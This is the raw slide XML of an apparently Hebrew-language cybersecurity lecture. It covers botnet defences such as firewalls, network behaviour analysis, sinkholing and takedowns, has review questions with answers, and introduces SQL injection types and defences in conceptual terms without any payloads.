              <a:t>לבוט</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>זהירות עם קבצים מצורפים וקישורים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: הימנעות מפתיחת קבצים מצורפים או לחיצה על קישורים ממקורות לא מוכרים, במיוחד בהודעות דוא"ל.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>חומת אש</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Firewall</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: שימוש בחומת אש שתגביל את התקשורת הלא רצויה ותמנע גישה מרחוק למחשב שלך.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="12576845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9165501-1F67-4CC0-AAC6-C4BF6E60877D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5854148" y="642594"/>
            <a:ext cx="5271052" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>דרכי הגנה מתקדמות</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A155044B-A527-4511-9922-70247C5FF248}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Network Behavior Analysis (NBA) .1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ניתוח התנהגות רשת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>NBA</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> הוא גישה שמבוססת על זיהוי התנהגות לא שגרתית ברשת כדי לזהות פעילות בוטים. לדוגמה, אם רואים כמויות גדולות של תעבורה בלתי רגילה מאותו מקור, זה עשוי להצביע על כך שמחשב ברשת הפך </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>לבוט</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>Sinkholing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> .2</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>זוהי טכניקה שבה מומחי אבטחה משתלטים על שם דומיין או כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שמשמשים את הבוטים לתקשורת עם ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> C&amp;C </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ומפנים את התקשורת לשרתים שלהם. זה מאפשר להם </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>לנטר</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> את פעילות הרשת ולעצור את ההפצה שלה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Botnet Takedown .3</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>זוהי פעולה מאורגנת, לרוב בשיתוף פעולה בין רשויות אכיפת החוק לבין ספקי שירותי אינטרנט, כדי להשבית את התשתיות של רשת הבוטים. זה נעשה על ידי השבתה של שרתי ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>C&amp;C </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> או על ידי תפיסת תוקפים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="334811929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ACF74FD-6DFC-4C0F-8801-9E94CBB4FEDE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9074426" y="642594"/>
            <a:ext cx="2050774"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DB73DADB-A7DC-41D9-809F-8A393C7CDA9B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. מה ההבדל בין רשת בוטים לבין תוכנה זדונית רגילה?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. מהן השיטות הנפוצות להידבקות ברשת בוטים?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. כיצד ניתן להקטין את הסיכון שהמחשב שלך יהפוך </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>לבוט</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ברשת בוטים?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. מהו שימוש נפוץ ברשת בוטים, וכיצד הוא מבוצע?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>5. כיצד רשת בוטים מסוג </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>P2P</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>משפרת את יכולת ההישרדות שלה לעומת רשת בוטים מסורתית?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="327004129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6E9B2BD-0115-4BCB-AE55-E0A966F41DF8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8865704" y="642594"/>
            <a:ext cx="2259496"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08234A44-7EEB-4E5B-85F9-6C7655600A9A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1808922"/>
            <a:ext cx="10058400" cy="4502426"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. תוכנה זדונית רגילה יכולה לפעול על מחשב יחיד ולבצע פעולות מזיקות מקומית. לעומת זאת, רשת בוטים כוללת מספר מחשבים נגועים (בוטים) שפועלים ביחד ומתואמים על ידי התוקף לביצוע פעולות מרובות ומורכבות כמו התקפת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> DDoS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>או הפצת דואר זבל.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. השיטות הנפוצות כוללות דוא"ל </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פישינג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>, הורדת תוכנות פרוצות, ביקור באתרים נגועים והתקנת תוכנות זדוניות שמבוצעת בשוגג על ידי המשתמש.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. ניתן להקטין את הסיכון על ידי שמירה על עדכונים שוטפים, שימוש בתוכנות אנטי-וירוס, זהירות בקבצים מצורפים וקישורים, והגדרת חומת אש יעילה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. שימוש נפוץ ברשת בוטים הוא התקפת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>DDoS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>. התוקף שולח פקודות לכל הבוטים לשלוח בקשות רבות לאתר או לשרת מסוים במטרה לגרום לעומס יתר שיביא לקריסתו או להאטה משמעותית בפעילותו.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>5. רשת בוטים מסוג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> P2P </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אינה תלויה בשרת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> C&amp;C</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מרכזי, ולכן קשה יותר להשבית אותה. כל </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>בוט</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> יכול לתקשר עם בוטים אחרים ולשלוח או לקבל פקודות, מה שמקטין את הסיכון להפסד שליטה על כל הרשת אם שרת אחד ייתפס או יושבת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="35401689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24B7DF21-04C8-4A41-A5A3-0206F8E1675F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2441050"/>
            <a:ext cx="10058400" cy="3931920"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="8000" dirty="0"/>
              <a:t>SQL Injection</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" sz="8000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="336110931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70E918C-D271-43E6-8B6C-2671A6605B8E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4999382" y="642594"/>
            <a:ext cx="6125817" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מה זה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL Injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{12726D0D-748D-475C-BEF1-E04D60DC15E8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066799" y="2629894"/>
            <a:ext cx="10058400" cy="3931920"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>SQL Injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הזרקת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> היא טכניקת התקפה שבה התוקף מחדיר קוד </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> זדוני לתוך שאילתה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Query </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> של בסיס נתונים דרך קלט שאינו מוגן כראוי. ההתקפה מנצלת חולשה בקוד התוכנה שמבצע שאילתות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בבסיס הנתונים, ומאפשרת לתוקף לבצע פעולות לא מורשות כמו גישה למידע רגיש, שינוי או מחיקת נתונים, ואף השתלטות על המערכת כולה.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="18323615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A165D7B-3117-4FC7-8076-0518AAB14493}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4005470" y="642594"/>
            <a:ext cx="7119730" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כיצד מתרחשת הזרקת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9A29AB10-BC30-44C9-A4AD-07CEBA3E2A5B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2629894"/>
            <a:ext cx="10058400" cy="3931920"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הזרקת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מתרחשת כאשר אפליקציה מקבלת קלט מהמשתמש ומשתמשת בו לבניית שאילתה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מבלי לאמת או לנקות את הקלט כראוי. לדוגמה, באתר שבו משתמש מתבקש להזין שם משתמש וסיסמה, הקלט מועבר לתוך שאילתת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> SQL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>לצורך אימות המידע. תוקף יכול לנצל את המצב ולהזין קוד </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>זדוני במקום קלט רגיל.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="149749117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86D8B3D-0C45-4425-BED7-9968A1A1A36E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4740964" y="642594"/>
            <a:ext cx="6384235" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>סוגים של </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL Injection</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F418841E-C769-4D1D-89BE-8D6A6C69C6AD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> :</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Classic SQL Injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ניצול ישיר של קלט לא מאובטח לביצוע שאילתות לא רצויות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> :</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Blind SQL Injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כאשר התוקף אינו מקבל משוב ישיר מהשרת על הצלחת או </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>כשלון</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ההתקפה, אך עדיין יכול לחלץ מידע על ידי מניפולציות מתוחכמות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Error-Based SQL Injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> :ניצול שגיאות שנוצרות במערכת כדי לחלץ מידע על מבנה בסיס הנתונים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Union-Based SQL Injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: שימוש בפעולת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>UNION</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כדי להוסיף נתונים נוספים לפלט השאילתה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="251393806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B42B7BF-2A0D-4B4C-9217-192EEA5A6EA8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3051312" y="642594"/>
            <a:ext cx="8073887" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כיצד להגן מפני </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL Injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7772568F-9500-4FAF-80E9-88D3EB266BD4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2103120"/>
            <a:ext cx="10058400" cy="4112286"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> :</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Validation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בדיקת קלט ואימותו לפני השימוש בו בשאילתות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> :</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Parameterized Queries</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שימוש בשאילתות פרמטריות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(Prepared Statements) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שמונעות שילוב קוד זדוני.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Stored Procedures</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: שימוש בפרוצדורות מאוחסנות בבסיס הנתונים שמפרידות בין הקוד לבין הקלט.</a:t>
            </a:r>
